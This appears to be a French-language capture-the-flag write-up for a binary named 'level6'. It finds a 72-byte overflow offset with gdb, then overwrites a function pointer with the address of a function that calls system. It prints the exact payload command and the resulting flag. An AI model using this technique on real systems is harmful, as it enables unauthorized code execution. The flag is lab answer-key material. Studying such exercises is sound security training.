@@ -1,0 +1,29 @@
+gdb level6
+
+Nous avons deux fonctions 'm' et 'n'
+'n' fait un call a 'system'
+
+Dans le main on constate deux call a malloc.
+
+Essayons de voir si nous pouvons pas faire un buffer overflow 
+
+(gdb) r $(perl -e 'print "A"x72')
+Starting program: /home/user/level6/level6 $(perl -e 'print "A"x72')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048408 in __do_global_dtors_aux ()
+
+L'offset est donc de 72, essayons maintenant de re-ecrire l'EIP avec l'addresse de la fonction 'n'
+
+On trouve l'addresse de 'n' grace a objdump -d
+
+08048454
+
+prepare:
+
+python -c "print 'A' * 72 + '\x54\x84\x04\x08'" > /tmp/level6
+
+./level6 `cat /tmp/level6`
+
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
